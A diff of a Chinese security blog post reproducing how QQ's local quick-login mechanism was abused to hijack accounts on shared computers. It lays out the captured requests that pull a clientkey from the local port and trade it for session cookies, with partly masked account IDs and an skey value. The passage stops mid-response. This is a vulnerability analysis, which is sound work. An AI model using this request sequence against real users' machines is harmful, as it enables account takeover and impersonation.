@@ -1,470 +1,241 @@
 <!DOCTYPE html>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="T3stzer0">
+
+
+    <meta name="subtitle" content="思考">
 
 
 
 
+<title>记一次QQ本地快捷登录漏洞复现 | T3stzer0&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
 
 
 
 
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
 
 
 
-
-  
-
-
-<html class="theme-next muse use-motion" lang="zh-CN">
-<head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
-<meta name="theme-color" content="#222"/>
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
 
 
 
-
-
-
-
-
-
-
-  <meta name="google-site-verification" content="googlea4e6eb27cf4f8663.html"/>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2"/>
-
-<link rel="stylesheet" href="/css/main.css?v=7.0.1"/>
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.0.1">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/avatar.jpg?v=7.0.1">
-
-
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/avatar.jpg?v=7.0.1">
-
-
-  <link rel="mask-icon" href="/images/logo.svg?v=7.0.1" color="#222">
-
-
-
-
-
-
-
-<script id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Muse',
-    version: '7.0.1',
-    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
-    back2top: true,
-    back2top_sidebar: false,
-    fancybox: false,
-    fastclick: false,
-    lazyload: false,
-    tabs: true,
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
-  };
+    
+    
+        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+    });
+</script>
+<!-- 给MathJax元素添加has-jax class -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+<!-- 通过连接CDN加载MathJax的js代码 -->
+<script type="text/javascript" async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
 </script>
 
 
-  
+    
 
-
-
-
-  <meta name="description" content="背景 昨天我的空间和Q群发布了一些莫名其妙的东西，大概是因为前两天去网吧开黑登了QQ。花了一些时间，弄清楚了这些漏洞的原理，搞了一下复现。 本篇文章就来说一说这些黑阔是怎么帮我发说说的。">
-<meta name="keywords" content="码代码,渗透">
-<meta property="og:type" content="article">
-<meta property="og:title" content="记一次QQ本地快捷登录漏洞复现">
-<meta property="og:url" content="https://www.wzsite.cn/2019/01/22/记一次QQ本地快捷登录漏洞复现/index.html">
-<meta property="og:site_name" content="Wz&#39;s Blog">
-<meta property="og:description" content="背景 昨天我的空间和Q群发布了一些莫名其妙的东西，大概是因为前两天去网吧开黑登了QQ。花了一些时间，弄清楚了这些漏洞的原理，搞了一下复现。 本篇文章就来说一说这些黑阔是怎么帮我发说说的。">
-<meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://www.wzsite.cn/2019/01/22/记一次QQ本地快捷登录漏洞复现/11-13-27.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2019/01/22/记一次QQ本地快捷登录漏洞复现/11-16-45.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2019/01/22/记一次QQ本地快捷登录漏洞复现/11-19-08.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2019/01/22/记一次QQ本地快捷登录漏洞复现/12-05-55.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2019/01/22/记一次QQ本地快捷登录漏洞复现/12-23-40.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2019/01/22/记一次QQ本地快捷登录漏洞复现/12-35-52.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2019/01/22/记一次QQ本地快捷登录漏洞复现/12-36-12.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2019/01/22/记一次QQ本地快捷登录漏洞复现/12-39-22.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2019/01/22/记一次QQ本地快捷登录漏洞复现/12-40-16.jpg">
-<meta property="og:updated_time" content="2019-01-22T05:00:03.937Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="记一次QQ本地快捷登录漏洞复现">
-<meta name="twitter:description" content="背景 昨天我的空间和Q群发布了一些莫名其妙的东西，大概是因为前两天去网吧开黑登了QQ。花了一些时间，弄清楚了这些漏洞的原理，搞了一下复现。 本篇文章就来说一说这些黑阔是怎么帮我发说说的。">
-<meta name="twitter:image" content="https://www.wzsite.cn/2019/01/22/记一次QQ本地快捷登录漏洞复现/11-13-27.jpg">
-
-
-
-
-
-  
-  
-  <link rel="canonical" href="https://www.wzsite.cn/2019/01/22/记一次QQ本地快捷登录漏洞复现/"/>
-
-
-
-<script id="page.configurations">
-  CONFIG.page = {
-    sidebar: "",
-  };
-</script>
-
-  <title>记一次QQ本地快捷登录漏洞复现 | Wz's Blog</title>
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  <noscript>
-  <style>
-  .use-motion .motion-element,
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-title { opacity: initial; }
-
-  .use-motion .logo,
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
 
 </head>
-
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
-
-  
-  
-    
-  
-
-  <div class="container sidebar-position-left page-post-detail">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta">
-    
-
-    <div class="custom-logo-site-title">
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Wz's Blog</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-    
-      
-        <p class="site-subtitle">安全菜鸡的挖坑填坑之旅</p>
-      
-    
-    
-  </div>
-
-  <div class="site-nav-toggle">
-    <button aria-label="切换导航栏">
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
-  </div>
-</div>
-
-
-
-<nav class="site-nav">
-  
-    <ul id="menu" class="menu">
-      
-        
-        
-        
-          
-          <li class="menu-item menu-item-home">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br/>首页</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-archives">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br/>归档</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-categories">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br/>分类</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-tags">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br/>标签</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-about">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br/>关于</a>
-
-  </li>
-
-      
-      
-    </ul>
-  
-
-  
-    
-
-  
-
-  
-</nav>
-
-
-
-  
-
-
-
-</div>
-    </header>
-
-    
-  
-  
-
-  
-
-  <a href="https://github.com/testzero-wz" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
-
-
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-          <div id="content" class="content">
-            
-
-  <div id="posts" class="posts-expand">
-    
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://www.wzsite.cn/2019/01/22/记一次QQ本地快捷登录漏洞复现/"/>
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="W z"/>
-      <meta itemprop="description" content=""/>
-      <meta itemprop="image" content="/images/avatar.gif"/>
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Wz's Blog"/>
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">记一次QQ本地快捷登录漏洞复现
-
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Home</a></div>
+            <div class="menu navbar-right">
                 
-              
-
-              <time title="创建时间：2019-01-22 10:19:00 / 修改时间：13:00:03" itemprop="dateCreated datePublished" datetime="2019-01-22T10:19:00+08:00">2019-01-22</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/安全之旅/" itemprop="url" rel="index"><span itemprop="name">安全之旅</span></a></span>
-
+                    <a class="menu-item" href="/archives">Posts</a>
                 
+                    <a class="menu-item" href="/category">Categories</a>
                 
-              
-            </span>
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
         </div>
-      </header>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Home</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
     
 
     
-    
-    
-    <div class="post-body" itemprop="articleBody">
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">记一次QQ本地快捷登录漏洞复现</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">T3stzer0</a>
+                    
 
-      
-      
+                    
+                        <span class="post-time">
+                        Date: <a href="#">一月 22, 2019&nbsp;&nbsp;10:19:00</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/category/安全之旅/">安全之旅</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
 
-      
-        <h2 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h2>
+        <div class="post-content">
+            <h2 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h2>
 <p>昨天我的空间和Q群发布了一些莫名其妙的东西，大概是因为前两天去网吧开黑登了QQ。花了一些时间，弄清楚了这些漏洞的原理，搞了一下复现。<br>
 本篇文章就来说一说这些黑阔是怎么帮我发说说的。</p>
 <a id="more"></a>
@@ -474,8 +245,8 @@
 <h2 id="罪魁祸首快捷登录"><a class="markdownIt-Anchor" href="#罪魁祸首快捷登录"></a> 罪魁祸首——快捷登录</h2>
 <p>经过查阅资料，基本坐实了是快捷登录的锅<br>
 以下是对整套黑产行为的概括</p>
-
-<p>对快捷登录研究了一下午，也用python做了复现，下面对其进行技术分析</p>
+<p><img src="/2019/01/22/记一次QQ本地快捷登录漏洞复现/Blank_Diagram.png" alt=""><br>
+对快捷登录研究了一下午，也用python做了复现，下面对其进行技术分析</p>
 <h2 id="技术分析"><a class="markdownIt-Anchor" href="#技术分析"></a> 技术分析</h2>
 <p>QQ现在实现快捷登录的方式是这样的</p>
 <ol>
@@ -487,29 +258,29 @@
 </ol>
 <p>现在对快捷登录的请求进行详细的抓包分析。<br>
 1. 向远处服务器请求，获取到<code>pt_local_token</code>参数</p>
-<img src="/2019/01/22/记一次QQ本地快捷登录漏洞复现/11-13-27.jpg" alt="11-13-27.jpg" title="">请求域名`xui.ptlogin2.qq.com`
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">GET /cgi-bin/xlogin?proxy_url=https%3A//qzs.qq.com/qzone/v6/portal/proxy.html&amp;daid=5&amp;&amp;hide_title_bar=1&amp;low_login=0&amp;qlogin_auto_login=1&amp;no_verifyimg=1&amp;link_target=blank&amp;appid=549000912&amp;style=22&amp;target=self&amp;s_url=https%3A%2F%2Fqzs.qzone.qq.com%2Fqzone%2Fv5%2Floginsucc.html%3Fpara%3Dizone&amp;pt_qr_app=%E6%89%8B%E6%9C%BAQQ%E7%A9%BA%E9%97%B4&amp;pt_qr_link=http%3A//z.qzone.com/download.html&amp;self_regurl=https%3A//qzs.qq.com/qzone/v6/reg/index.html&amp;pt_qr_help_link=http%3A//z.qzone.com/download.html&amp;pt_no_auth=1 HTTP/1.1</div><div class="line">Host: xui.ptlogin2.qq.com</div></pre></td></tr></table></figure>
+<p><img src="/2019/01/22/记一次QQ本地快捷登录漏洞复现/11-13-27.jpg" alt="">请求域名<code>xui.ptlogin2.qq.com</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /cgi-bin/xlogin?proxy_url=https%3A//qzs.qq.com/qzone/v6/portal/proxy.html&amp;daid=5&amp;&amp;hide_title_bar=1&amp;low_login=0&amp;qlogin_auto_login=1&amp;no_verifyimg=1&amp;link_target=blank&amp;appid=549000912&amp;style=22&amp;target=self&amp;s_url=https%3A%2F%2Fqzs.qzone.qq.com%2Fqzone%2Fv5%2Floginsucc.html%3Fpara%3Dizone&amp;pt_qr_app=%E6%89%8B%E6%9C%BAQQ%E7%A9%BA%E9%97%B4&amp;pt_qr_link=http%3A//z.qzone.com/download.html&amp;self_regurl=https%3A//qzs.qq.com/qzone/v6/reg/index.html&amp;pt_qr_help_link=http%3A//z.qzone.com/download.html&amp;pt_no_auth=1 HTTP/1.1</span><br><span class="line">Host: xui.ptlogin2.qq.com</span><br></pre></td></tr></table></figure>
 <p>url其中的一些参数并不需要理会，抓个包复制上去就好。<br>
 这个请求检查了<code>Referer</code>，所以<code>Referer</code>要改成<code>*.qq.com</code><br>
 请求的响应中，设置了<code>pt_local_token</code>这个cookie</p>
-<img src="/2019/01/22/记一次QQ本地快捷登录漏洞复现/11-16-45.jpg" alt="11-16-45.jpg" title="">2\. 带着` pt_local_token`，对本地端口进行请求，获取账号信息
-<img src="/2019/01/22/记一次QQ本地快捷登录漏洞复现/11-19-08.jpg" alt="11-19-08.jpg" title="">返回的响应是一段JS
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">HTTP/1.1 200 OK</div><div class="line">Content-Type: Application/javascript</div><div class="line">Content-Length: 323</div><div class="line"></div><div class="line">var var_sso_uin_list=[&#123;&quot;account&quot;:&quot;12345678&quot;,&quot;client_type&quot;:65793,&quot;face_index&quot;:0,&quot;gender&quot;:1,&quot;nickname&quot;:&quot;testzero&quot;,&quot;uin&quot;:&quot;12345678&quot;,&quot;uin_flag&quot;:4719111&#125;,&#123;&quot;account&quot;:&quot;12345678&quot;,&quot;client_type&quot;:65793,&quot;face_index&quot;:534,&quot;gender&quot;:1,&quot;nickname&quot;:&quot;testzero&quot;,&quot;uin&quot;:&quot;12345678&quot;,&quot;uin_flag&quot;:32142&#125;];ptui_getuins_CB(var_sso_uin_list);</div></pre></td></tr></table></figure>
+<p><img src="/2019/01/22/记一次QQ本地快捷登录漏洞复现/11-16-45.jpg" alt="">2. 带着<code>pt_local_token</code>，对本地端口进行请求，获取账号信息</p>
+<p><img src="/2019/01/22/记一次QQ本地快捷登录漏洞复现/11-19-08.jpg" alt="">返回的响应是一段JS</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: Application/javascript</span><br><span class="line">Content-Length: 323</span><br><span class="line"></span><br><span class="line">var var_sso_uin_list=[&#123;&quot;account&quot;:&quot;12345678&quot;,&quot;client_type&quot;:65793,&quot;face_index&quot;:0,&quot;gender&quot;:1,&quot;nickname&quot;:&quot;testzero&quot;,&quot;uin&quot;:&quot;12345678&quot;,&quot;uin_flag&quot;:4719111&#125;,&#123;&quot;account&quot;:&quot;12345678&quot;,&quot;client_type&quot;:65793,&quot;face_index&quot;:534,&quot;gender&quot;:1,&quot;nickname&quot;:&quot;testzero&quot;,&quot;uin&quot;:&quot;12345678&quot;,&quot;uin_flag&quot;:32142&#125;];ptui_getuins_CB(var_sso_uin_list);</span><br></pre></td></tr></table></figure>
 <p>这里面包含本地已登录的账户信息，包括账号，昵称和性别以及一些其他参数</p>
 <p>3. 带着<code>pt_local_token</code>以及账号对本地端口进行请求，获取指定账号的<code>clientkey</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">GET /pt_get_st?clientuin=3537***086&amp;callback=ptui_getst_CB&amp;r=0.03809848617064593&amp;pt_local_tk=2008428654 HTTP/1.1</div><div class="line">Host: localhost.ptlogin2.qq.com:4301</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /pt_get_st?clientuin=3537***086&amp;callback=ptui_getst_CB&amp;r=0.03809848617064593&amp;pt_local_tk=2008428654 HTTP/1.1</span><br><span class="line">Host: localhost.ptlogin2.qq.com:4301</span><br></pre></td></tr></table></figure>
 <p>其中参数<code>clientuin</code>是Q号，<code>r</code>是随机数，可以随便给，<code>pt_local_tk</code>就是<code>pt_local_token</code><br>
 请求响应返回一个<code>clientkey</code>的<code>Set-Cookie</code></p>
-<img src="/2019/01/22/记一次QQ本地快捷登录漏洞复现/12-05-55.jpg" alt="12-05-55.jpg" title="">
+<p><img src="/2019/01/22/记一次QQ本地快捷登录漏洞复现/12-05-55.jpg" alt=""></p>
 <p>4. 带着包含<code>clientkey</code>的cookie向远程服务器进行登录</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">GET /jump?clientuin=3537***086&amp;keyindex=9&amp;pt_aid=549000912&amp;daid=5&amp;u1=https%3A%2F%2Fqzs.qzone.qq.com%2Fqzone%2Fv5%2Floginsucc.html%3Fpara%3Dizone&amp;pt_local_tk=2008428654&amp;pt_3rd_aid=0&amp;ptopt=1&amp;style=40 HTTP/1.1</div><div class="line">Host: ssl.ptlogin2.qq.com</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /jump?clientuin=3537***086&amp;keyindex=9&amp;pt_aid=549000912&amp;daid=5&amp;u1=https%3A%2F%2Fqzs.qzone.qq.com%2Fqzone%2Fv5%2Floginsucc.html%3Fpara%3Dizone&amp;pt_local_tk=2008428654&amp;pt_3rd_aid=0&amp;ptopt=1&amp;style=40 HTTP/1.1</span><br><span class="line">Host: ssl.ptlogin2.qq.com</span><br></pre></td></tr></table></figure>
 <p>其中<code>clientuin</code>是账号，<code>u1</code>是对应业务的地址，各种带着<code>id</code>的字段应该都是对应业务，抓个包复制下来就好了，不用太在意。<br>
 这一步并不需要什么认证，带上刚才的Cookie，发送对应的请求就可以获得登录的Cookie（包含<code>skey</code>字段），以及会返回一个验证的网址，需要<code>GET</code>一下这个网址才能获取到真正的应用登录Cookie（包含<code>p_skey</code>字段）<br>
 请求响应：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">HTTP/1.1 200 OK</div><div class="line">Date: Tue, 22 Jan 2019 03:27:50 GMT</div><div class="line">Content-Type: application/javascript</div><div class="line">P3P: CP=CAO PSA OUR</div><div class="line">Server: Tencent Login Server/2.0.0</div><div class="line">Strict-Transport-Security: max-age=31536000</div><div class="line">Set-Cookie: pt2gguin=;Expires=Thu, 01 Jan 1970 00:00:00 GMT;Path=/;Domain=qq.com;</div><div class="line">Set-Cookie: pt2gguin=o3534***3086;Expires=Tue, 19 Jan 2038 03:14:07 GMT;Path=/;Domain=ptlogin2.qq.com;</div><div class="line">Set-Cookie: ETK=;Path=/;Domain=ptlogin2.qq.com;</div><div class="line">Set-Cookie: uin=o3534***3086;Path=/;Domain=qq.com;</div><div class="line">Set-Cookie: skey=@72eionO2j;Path=/;Domain=qq.com;</div><div class="line">省略若干Set-Cookie</div><div class="line"></div><div class="line">ptui_qlogin_CB(&apos;0&apos;, &apos;https://ptlogin2.qzone.qq.com/check_sig?pttype=2&amp;uin=3534***3086&amp;service=jump&amp;nodirect=0&amp;ptsigx=a1199b83fbabffba57f259d79a1d2f221d70579cde815b7284a9d8201fc4d9a34bc133aacc444dd2309b1908aa05393ddc39433&amp;s_url=https%3A%2F%2Fqzs.qzone.qq.com%2Fqzone%2Fv5%2Floginsucc.html%3Fpara%3Dizone&amp;f_url=&amp;ptlang=2052&amp;ptredirect=100&amp;aid=1000101&amp;daid=5&amp;j_later=0&amp;low_login_hour=0&amp;regmaster=0&amp;pt_login_type=2&amp;pt_aid=549000912&amp;pt_aaid=0&amp;pt_light=0&amp;pt_3rd_aid=0&apos;, &apos;&apos;)</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Tue, 22 Jan 2019 03:27:50 GMT</span><br><span class="line">Content-Type: application/javascript</span><br><span class="line">P3P: CP=CAO PSA OUR</span><br><span class="line">Server: Tencent Login Server/2.0.0</span><br><span class="line">Strict-Transport-Security: max-age=31536000</span><br><span class="line">Set-Cookie: pt2gguin=;Expires=Thu, 01 Jan 1970 00:00:00 GMT;Path=/;Domain=qq.com;</span><br><span class="line">Set-Cookie: pt2gguin=o3534***3086;Expires=Tue, 19 Jan 2038 03:14:07 GMT;Path=/;Domain=ptlogin2.qq.com;</span><br><span class="line">Set-Cookie: ETK=;Path=/;Domain=ptlogin2.qq.com;</span><br><span class="line">Set-Cookie: uin=o3534***3086;Path=/;Domain=qq.com;</span><br><span class="line">Set-Cookie: skey=@72eionO2j;Path=/;Domain=qq.com;</span><br><span class="line">省略若干Set-Cookie</span><br><span class="line"></span><br><span class="line">ptui_qlogin_CB(&apos;0&apos;, 